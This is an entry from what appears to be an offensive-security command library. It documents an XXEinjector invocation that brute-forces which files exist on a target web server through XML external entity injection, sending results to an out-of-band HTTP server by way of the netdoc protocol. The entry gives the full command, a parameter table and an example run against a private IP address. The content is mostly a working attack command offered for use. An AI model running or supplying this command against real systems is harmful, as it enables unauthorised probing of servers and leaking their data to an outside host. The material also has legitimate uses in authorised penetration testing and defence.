---
id: b3fe88e6-325e-4089-bf41-2a27505764cd
name: xxeinjector-bruteforce-files-http-oob-netdoc
type: command
executor: bash
data: >-
  ruby XXEinjector.rb --host=$__HOST --brute=/tmp/filenames.txt
  --file=/tmp/req.txt --oob=http --netdoc
output: null
created_at: '2023-04-06T03:56:43.973482+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
tags:
  - xxe
  - bruteforce
  - oob
verified: true
validated: true
---

# xxeinjector-bruteforce-files-http-oob-netdoc

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
```

## Description

Bruteforces file existence using HTTP OOB and netdoc protocol in XXE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --brute=/tmp/filenames.txt | Wordlist of filenames | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --oob=http | HTTP OOB | Built-in |
| --netdoc | Use netdoc protocol | Built-in |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
```

## Expected Output

Hits from wordlist, data on OOB server.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
